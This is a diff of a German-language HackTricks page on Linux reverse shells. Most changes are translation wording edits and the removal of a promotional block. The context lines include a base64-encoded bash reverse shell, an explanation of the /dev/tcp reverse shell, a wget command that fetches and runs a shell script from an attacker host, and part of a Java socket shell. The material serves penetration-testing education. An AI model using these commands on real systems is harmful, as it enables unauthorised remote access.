@@ -15,19 +15,11 @@ Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-**Wenn du Fragen zu einer dieser Shells hast, kannst du sie bei** [**https://explainshell.com/**](https://explainshell.com) **überprüfen.**
+**Wenn du Fragen zu einer dieser Shells hast, kannst du sie auf** [**https://explainshell.com/**](https://explainshell.com) **überprüfen.**
 
 ## Vollständiges TTY
 
-**Sobald du eine Reverse-Shell erhältst**[ **lies diese Seite, um ein vollständiges TTY zu erhalten**](full-ttys.md)**.**
+**Sobald du eine Reverse-Shell erhältst,** [**lies diese Seite, um ein vollständiges TTY zu erhalten**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -56,10 +48,10 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 #### Shell-Erklärung
 
 1. **`bash -i`**: Dieser Teil des Befehls startet eine interaktive (`-i`) Bash-Shell.
-2. **`>&`**: Dieser Teil des Befehls ist eine Kurznotation für **das Umleiten von sowohl Standardausgabe** (`stdout`) als auch **Standardfehler** (`stderr`) zu **dem gleichen Ziel**.
+2. **`>&`**: Dieser Teil des Befehls ist eine Kurznotation für **das Umleiten von sowohl Standardausgabe** (`stdout`) als auch **Standardfehler** (`stderr`) an **das gleiche Ziel**.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Dies ist eine spezielle Datei, die **eine TCP-Verbindung zur angegebenen IP-Adresse und dem Port** darstellt.
 * Durch **das Umleiten der Ausgabe- und Fehlerströme zu dieser Datei** sendet der Befehl effektiv die Ausgabe der interaktiven Shell-Sitzung an die Maschine des Angreifers.
-4. **`0>&1`**: Dieser Teil des Befehls **leitet die Standardeingabe (`stdin`) zum gleichen Ziel wie die Standardausgabe (`stdout`) um**.
+4. **`0>&1`**: Dieser Teil des Befehls **leitet die Standardeingabe (`stdin`) an das gleiche Ziel wie die Standardausgabe (`stdout`) um**.
 
 ### In Datei erstellen und ausführen
 ```bash
@@ -68,7 +60,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Wenn man mit einer **Remote Code Execution (RCE)**-Schwachstelle in einer Linux-basierten Webanwendung umgeht, kann das Erreichen einer Reverse Shell durch Netzwerkverteidigungen wie iptables-Regeln oder komplexe Paketfiltermechanismen behindert werden. In solchen eingeschränkten Umgebungen besteht ein alternativer Ansatz darin, eine PTY (Pseudo Terminal)-Shell einzurichten, um effektiver mit dem kompromittierten System zu interagieren.
+Wenn man es mit einer **Remote Code Execution (RCE)**-Schwachstelle in einer Linux-basierten Webanwendung zu tun hat, kann das Erreichen einer Reverse Shell durch Netzwerkverteidigungen wie iptables-Regeln oder komplexe Paketfiltermechanismen behindert werden. In solchen eingeschränkten Umgebungen besteht ein alternativer Ansatz darin, eine PTY (Pseudo Terminal)-Shell einzurichten, um effektiver mit dem kompromittierten System zu interagieren.
 
 Ein empfohlenes Tool für diesen Zweck ist [toboggan](https://github.com/n3rada/toboggan.git), das die Interaktion mit der Zielumgebung vereinfacht.
 
@@ -340,23 +332,17 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 * [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
-Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Unterstütze HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
-* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos sendest.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
